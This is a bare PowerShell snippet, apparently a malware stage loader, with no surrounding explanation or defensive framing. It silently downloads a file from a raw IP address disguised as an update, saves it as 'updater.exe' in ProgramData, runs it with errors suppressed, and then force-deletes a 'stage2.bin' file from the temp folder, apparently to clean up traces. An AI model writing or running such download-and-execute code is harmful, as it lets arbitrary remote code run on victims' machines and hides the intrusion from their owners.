
<# Remote fetch #> try { curl.exe -s -L -o "C:\ProgramData\updater.exe" "http://192.0.2.218:80/assets/update.dat"; Start-Process -FilePath "C:\ProgramData\updater.exe" -ErrorAction SilentlyContinue; Set-Location -Path $env:TEMP; Remove-Item -Path "$env:TEMP\stage2.bin" -Force } catch { Write-Warning "Stage transfer failed" }
